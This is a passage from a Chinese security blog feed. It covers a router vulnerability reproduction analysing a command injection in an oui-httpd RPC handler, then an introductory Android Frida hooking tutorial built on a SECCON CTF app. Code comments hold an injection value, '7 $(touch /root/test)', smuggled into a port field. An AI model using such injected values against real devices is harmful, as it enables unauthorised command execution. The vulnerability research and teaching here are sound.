&lt; 3 then  ---params 至少三个参数</span><br><span class="line">        local resp = rpc.error_res  ponse(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local sid, object, method, args = params[1], params[2], params[3], params[4] -- &quot;&quot; &quot;s2s&quot; &quot;enable_echo_server&quot; &quot;&#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    if type(sid) ~= &quot;string&quot; or type(object) ~= &quot;string&quot; or type(method) ~= &quot;string&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return  </span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if args and type(args) ~= &quot;table&quot; then   ---- 上述为一些参数类型的验证</span><br><span class="line">        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    ngx.ctx.sid = sid</span><br><span class="line"></span><br><span class="line">    if not rpc.is_no_auth(object, method) then</span><br><span class="line">        if not rpc.access(&quot;rpc&quot;, object .. &quot;.&quot; .. method) then   --- 通过本地调用是不需要进行身份验证的</span><br><span class="line">            local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)</span><br><span class="line">            ngx.say(cjson.encode(resp))</span><br><span class="line">            return</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local res = rpc.call(object, method, args) --- 调用rpc.lua 下的 call 并传入参数</span><br><span class="line">    if type(res) == &quot;number&quot; then</span><br><span class="line">        local resp = rpc.error_response(id, res)</span><br><span class="line">        ngx.say(cjson.encode(resp))</span><br><span class="line">        return</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    if type(res) ~= &quot;table&quot; then res = &#123;&#125; end</span><br><span class="line"></span><br><span class="line">    local resp = rpc.result_response(id, res)</span><br><span class="line">    ngx.say(cjson.encode(resp))</span><br><span class="line">end</span><br><span class="line">M.call = function(object, method, args)  -- s2s enable_echo_server &#123;&quot;port&quot;: &quot;7 $(touch /root/test)&quot;&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    if not objects[object] then</span><br><span class="line">        local script = &quot;/usr/lib/oui-httpd/rpc/&quot; .. object</span><br><span class="line">        if not fs.access(script) then   --- 调用 fs 的 access函数，即判断是否存在该 脚本</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        local ok, tb = pcall(dofile, script)  -- 使用 pcall 安全执行 dofile 加载脚本 ，tb是函数表</span><br><span class="line">        if not ok then               --- 因为 s2s.so 是二进制脚本 无法正常pcall加载 调用glc_call</span><br><span class="line">            ngx.log(ngx.ERR, tb)</span><br><span class="line">            return glc_call(object, method, args)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        if type(tb) == &quot;table&quot; then</span><br><span class="line">            local funs = &#123;&#125;</span><br><span class="line">            for k, v in pairs(tb) do</span><br><span class="line">                if type(v) == &quot;function&quot; then</span><br><span class="line">                    funs[k] = v</span><br><span class="line">                end</span><br><span class="line">            end</span><br><span class="line">            objects[object] = funs</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local fn = objects[object] and objects[object][method]   --- 无法调用 </span><br><span class="line">    if not fn  then</span><br><span class="line">        return glc_call(object, method, args)      ---使用glc_call 参数s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    return fn(args)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>调用glc_call：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">local function glc_call(object, method, args)   --- s2s enable_echo_server &#123;....&#125;</span><br><span class="line">    ngx.log(ngx.DEBUG, &quot;call C: &#x27;&quot;, object, &quot;.&quot;, method, &quot;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    local res = ngx.location.capture(&quot;/cgi-bin/glc&quot;, &#123;   ---- 发起一个内部请求到 /cgi-bin/glc POST请求 参数如下（这是Openresty平台的lua用法）</span><br><span class="line">        method = ngx.HTTP_POST,</span><br><span class="line">        body = cjson.encode(&#123;</span><br><span class="line">            object = object,</span><br><span class="line">            method = method,</span><br><span class="line">            args = args or &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if res.status ~= ngx.HTTP_OK then return M.ERROR_CODE_INTERNAL_ERROR end</span><br><span class="line"></span><br><span class="line">    local body = res.body</span><br><span class="line">    local code = tonumber(body:match(&quot;(-?%d+)&quot;))</span><br><span class="line"></span><br><span class="line">    if code ~= M.ERROR_CODE_NONE then</span><br><span class="line">        local err_msg = body:match(&quot;%d+ (.+)&quot;)</span><br><span class="line">        if err_msg then</span><br><span class="line">            ngx.log(ngx.ERR, err_msg)</span><br><span class="line">        end</span><br><span class="line">        return code</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    local msg = body:match(&quot;%d+ (.*)&quot;)</span><br><span class="line"></span><br><span class="line">    return cjson.decode(msg)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><strong>&#x2F;cgi-bin&#x2F;glc：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  snprintf(rpc_lib_path, 0x80u, &quot;%s/%s.so&quot;, &quot;/usr/lib/oui-httpd/rpc&quot;, v30);//v30由params[1]传入,为s2s</span><br><span class="line">  dl_handle = dlopen(rpc_lib_path, 2);          // 动态加载共享库</span><br><span class="line">  dl_handle_copy = dl_handle;</span><br><span class="line">  if ( !dl_handle )</span><br><span class="line">  &#123;</span><br><span class="line">    dl_error_msg = dlerror();</span><br><span class="line">    printf(&quot;%d dlopen: %s&quot;, -32601, dl_error_msg);</span><br><span class="line">    goto LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  json_rpc_function = (int (__fastcall *)(int, int))dlsym(dl_handle, name);  //加载符号 name由params[2]传入</span><br><span class="line">  if ( json_rpc_function )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( argc &gt; 3 )</span><br><span class="line">      json_params = json_loads((int)argv[3], 0, 0);    // json_params</span><br><span class="line">    if ( !json_params )</span><br><span class="line">      json_params = ::json_object();</span><br><span class="line">    json_object_new = ::json_object();</span><br><span class="line">    json_response_object = json_object_new;</span><br><span class="line">    if ( logging_enabled )</span><br><span class="line">    &#123;</span><br><span class="line">      __gl_log(69505, 116, 0, &quot;glc call meth %s/%s\n&quot;, v30, name);</span><br><span class="line">      json_rpc_return = json_rpc_function(json_params, json_response_object);   // 以json_params为参数调用json_rpc_function，即上述params[1]的params[2]函数</span><br><span class="line">      __gl_log(69505, 118, 0, &quot;glc call end,ret = %d\n&quot;, json_rpc_return);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_return);</span><br><span class="line">      if ( json_rpc_return )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_30:</span><br><span class="line">        sub_10990(json_params);</span><br><span class="line">        sub_10990(json_response_object);</span><br><span class="line">        goto LABEL_41;</span><br><span class="line">      &#125;</span><br><span class="line">      json_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">      __gl_log(69505, 121, 0, &quot;glc call result %s\n&quot;, json_response_str);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      json_rpc_call = json_rpc_function(json_params, json_object_new);</span><br><span class="line">      printf(&quot;%d&quot;, json_rpc_call);</span><br><span class="line">      if ( json_rpc_call )</span><br><span class="line">        goto LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    final_response_str = (const char *)json_dumps(json_response_object, 0);</span><br><span class="line">    printf(&quot; %s&quot;, final_response_str);</span><br><span class="line">    goto LABEL_30;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以得到调用的是s2s.so文件的enable_echo_server函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">backupValue = *(_DWORD *)off_16FC0;</span><br><span class="line">memset(commandBuffer, 0, sizeof(commandBuffer));</span><br><span class="line">portObject = json_object_get(jsonInput, &quot;port&quot;);   ///从参数中获取port键值对</span><br><span class="line">portString = (const char *)json_string_value(portObject);   //获取键值</span><br><span class="line">if ( *portString )</span><br><span class="line">&#123;</span><br><span class="line">  portValue = portString;</span><br><span class="line">  if ( atoi(portString) &gt; 0 &amp;&amp; atoi(portValue) &lt;= 65534 )  /// 只比较了大小，没有检查类型</span><br><span class="line">  &#123;</span><br><span class="line">    if ( check_file_is_exist(&quot;/usr/bin/echo_server&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      formatCommand = (void (*)(_BYTE *, int, const char *, ...))snprintf_0;</span><br><span class="line">      snprintf_0(commandBuffer, 128, &quot;kill -9 $(pgrep -f \&quot;%s\&quot;)&quot;, &quot;/usr/bin/echo_server&quot;);</span><br><span class="line">      executeCommand = (int (__fastcall *)(_BYTE *))system_0;</span><br><span class="line">      system_0(commandBuffer);</span><br><span class="line">      formatCommand(commandBuffer, 128, &quot;%s -p %s -f&quot;, &quot;/usr/bin/echo_server&quot;, portValue);//命令执行</span><br><span class="line">      commandOutput = executeCommand(commandBuffer);</span><br></pre></td></tr></table></figure><p>可以看到这个命令注入显然是执行本地注入的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些路由器漏洞复现&quot;&gt;&lt;a href=&quot;#一些路由器漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;一些路由器漏洞复现&quot;&gt;&lt;/a&gt;一些路由器漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>android之hook入门</title>
    <link href="http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/"/>
    <id>http://s1nec-1o.github.io/2025/03/28/android%E4%B9%8Bhook%E5%85%A5%E9%97%A8/</id>
    <published>2025-03-28T12:10:45.000Z</published>
    <updated>2025-03-28T12:34:03.601Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Android运行机制"><a href="#Android运行机制" class="headerlink" title="Android运行机制"></a>Android运行机制</h2><p>一般而言，在启动一个 App 时，Android 会首先执行 Application 类（AndroidManifest.xml 文件中注明）的创建工作，然后再开始执行 Main Activity，继而根据各种各样的逻辑执行相关代码。</p><h2 id="Android-逆向"><a href="#Android-逆向" class="headerlink" title="Android 逆向"></a>Android 逆向</h2><ul><li>分析方法，可以采用以下方式<ul><li>静态分析，对源代码进行逆向，然后阅读分析</li><li>动态分析，对代码进行动态调试，一般来说动态分析离不开静态分析。</li></ul></li><li>分析对象，一般有以下两类对象<ul><li>java层代码</li><li>原生层代码</li></ul></li></ul><p>Android 逆向主要应用于以下几个方向</p><ol><li>app 安全审查</li><li>系统漏洞挖掘</li><li>恶意代码杀查</li><li>同行业产品技术原理分析</li><li>移除安全机制</li></ol><p><strong>AndroidManifest.xml 文件</strong></p><ul><li>软件包名</li><li>apk 主活动，隐藏程序没有主 Activity</li></ul><p><strong>Application 在 java 层启动最早</strong></p><h3 id="逆向技巧"><a href="#逆向技巧" class="headerlink" title="逆向技巧"></a>逆向技巧</h3><p><strong>字符串定位：</strong></p><ul><li>程序报错信息</li><li>服务</li><li>广播</li></ul><p><strong>敏感API定位：</strong></p><ul><li>控件的事件函数<ul><li>onclick</li><li>show</li><li>Toast</li></ul></li><li>网络函数<ul><li>HttpGet</li><li>HttpPost</li><li>HttpUriRequest</li><li>socket</li></ul></li><li>发送短信</li><li>打电话</li><li>定位</li><li>等等</li></ul><p><strong>log信息：</strong></p><ul><li>利用程序本身产生的 log 信息</li><li>自己对代码反编译，插入 log 信息，并重打包来进行分析。</li></ul><p><strong>栈跟踪：</strong></p><p>我们可以用 ddms 提供的方法调用链的信息来判断程序目前的调用关系如何。</p><p><strong>钩子：</strong> </p><ul><li>xposed</li><li>cydia</li></ul><p><strong>monitor：</strong></p><ul><li>运行 log，程序运行产生的，系统运行产生的</li><li>线程跟踪</li><li>方法调用链</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>mumu模拟器、adb、jadx和frida</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">adb connect 127.0.0.1:16384  # mumu-&gt;问题诊断 adb调试端口16384</span><br><span class="line">adb devices                       #显示已连接设备</span><br><span class="line">adb shell getprop ro.product.cpu.abi #查看系统型号</span><br><span class="line">adb push frida-server-16.6.6-android-x86_64 /data/local/tmp #将frida-server push进模拟器</span><br><span class="line">adb root #root</span><br><span class="line">adb shell #root进shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell</span></span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 frida-server-16.6.6-android-x86_64</span><br><span class="line">./frida-server-16.6.6-android-x86_64</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win</span></span><br><span class="line">frida-ps -U #通过USB连接查看进程情况</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida-ps -R #通过远程连接查看进程情况</span><br></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><a href="https://blog.potatowo.top/2025/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Frida/game.apk">链接</a></p><p><code>frida-ps -U</code>找到进程号</p><p><code>frida -U -p 3897</code></p><p>一个简单的石头剪刀布的游戏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seccon2015.rock_paper_scissors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> extends Activity implements View.OnClickListener &#123;</span><br><span class="line">    Button P;</span><br><span class="line">    Button S;</span><br><span class="line">    <span class="type">int</span> flag;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    Button r;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">            TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">                tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> native <span class="type">int</span> <span class="title">calc</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line">        System.<span class="built_in">loadLibrary</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">        <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">        <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">        <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">        <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">            TextView tv3 = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            TextView tv = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">            TextView tv2 = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">            <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">            String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">            tv2.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">                tv.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android 会首先执行 Application 类，但是开发者一般是不需要去处理它的，对于Activity来说，标准的生命周期入口点是：**<code>onCreate()</code> 方法**，我们就可以通过重写来调用我们的第一个方法</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    <span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">    <span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line">    <span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br><span class="line">    <span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用父类(Activity)的 <code>onCreate</code> 方法（必须）</p><p><code>setContentView(R.layout.activity_main);</code>这是将XML布局文件渲染成可视化的界面，在jadx里双击可以发现定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> activity_main = <span class="number">0x7f040018</span>;</span><br></pre></td></tr></table></figure><ol><li>传入资源ID <code>0x7f040018</code></li><li>系统解析：<ul><li>包ID 0x7f → 当前应用资源</li><li>类型ID 0x04 → layout类型</li><li>项ID 0x0018 → 第24个layout资源</li></ul></li><li>查找 resources.arsc 表</li><li>找到对应的 activity_main.xml 